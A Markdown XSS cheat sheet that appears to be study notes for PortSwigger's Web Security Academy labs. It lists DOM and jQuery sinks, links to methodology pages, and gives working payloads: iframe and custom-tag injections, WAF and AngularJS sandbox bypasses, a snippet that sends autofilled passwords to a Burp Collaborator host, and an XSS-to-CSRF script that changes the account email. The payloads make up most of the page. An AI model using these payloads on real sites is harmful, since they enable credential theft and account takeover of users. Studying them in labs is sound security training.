# XSS
	XSS : Cross-Site Scripting




- [google csp validator](https://csp-evaluator.withgoogle.com/)
##### techniques:
- read portswigger's [methodology](https://portswigger.net/web-security/cross-site-scripting/reflected#:~:text=How%20to%20find%20and%20test%20for%20reflected%20XSS%20vulnerabilities) for finding reflected xss
- read portswigger's [methodology](https://portswigger.net/web-security/cross-site-scripting/stored#:~:text=How%20to%20find%20and%20test%20for%20stored%20XSS%20vulnerabilities) for finding stored xss
- read portsiwgger's [methodology](https://portswigger.net/web-security/cross-site-scripting/dom-based#:~:text=How%20to%20test%20for%20DOM%2Dbased%20cross%2Dsite%20scripting) for finding DOM xss
- .innerHTML attribute doesn't accept `script - svg` elements, use alternatives
- search for any non escaped character 
- try several tags, including custom tags 
- if output is encoded try multi-encoded payload
- xss cheat sheet by [Gareth Heyes](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

###### sinks can lead to dom-xss:
```javascript
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```
###### jQuery sinks lead to dom-xss:
```Javascript
add()
after()
append() 
animate() 
insertAfter()
insertBefore() 
before()
html()
prepend() 
replaceAll() 
replaceWith() 
wrap() 
wrapInner()
wrapAll() 
has() 
constructor() 
init() 
index()
jQuery.parseHTML() 
$.parseHTML()
```

###### payloads: 
- [payloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [Gareth Heyes research on portswigger](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs)
- random payloads
```html
<!-- xss reflected in sink -->
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
<!-- xss in body and auto resize screen  -->
<iframe src="https://your-lab-id.web-security-academy.net/?search=%22><body onresize=print()>" onload=this.style.width='100px'>

<!-- xss in custom tag-->
<script> 
location = 'https://your-lab-id.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>

<!-- -->
<svg><animatetransform onbegin=alert(1)>

<!-- bypass some kind of WAF-->
<><img src=1 onerror=alert(1)>

<!-- xss in canonical link -->
'accesskey='x' onclick='alert()

<!-- xss in js template -->
${alert(1)}

<!-- -->
<svg><a><animate+attributeName=href+values=javascript:alert(document.cookie) /><text+x=20+y=20>Click</text></a></svg>

<!-- capture password from auto-fill  -->
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">


```
```javascript
//js 
'sometext'.toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
//AngularJs
{{$on.constructor('alert(1)')()}}
//AngularJs
$event.path|orderBy:'[].constructor.from([1],alert)'
//AngularJs
$event.path|orderBy:'[].constructor.from([1].map(alert))'
```

- xss to csrf
```html
<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>
```